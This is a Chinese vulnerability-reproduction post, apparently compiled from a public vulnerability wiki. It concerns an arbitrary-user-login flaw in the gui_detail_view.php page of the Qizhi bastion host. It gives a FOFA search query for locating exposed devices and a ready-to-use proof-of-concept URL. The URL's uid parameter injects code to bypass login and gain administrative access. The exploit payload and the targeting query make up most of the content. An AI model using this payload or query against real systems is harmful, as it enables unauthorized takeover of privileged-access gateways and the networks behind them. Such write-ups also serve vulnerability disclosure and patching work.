---
title: "齐治堡垒机 gui_detail_view.php 任意用户登录漏洞"
date: 2026-10-18 09:17:11
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "齐治堡垒机"
tags:
  - "齐治堡垒机"
  - "漏洞复现"
---
## 漏洞描述

齐治堡垒机 存在任意用户登录漏洞，访问特定的Url即可获得后台权限

## 漏洞影响

```
齐治堡垒机
```

## 网络测绘

```
app="齐治科技-堡垒机"
```

## 漏洞复现

漏洞POC为

```plain
http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202101931947.png)

## 

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
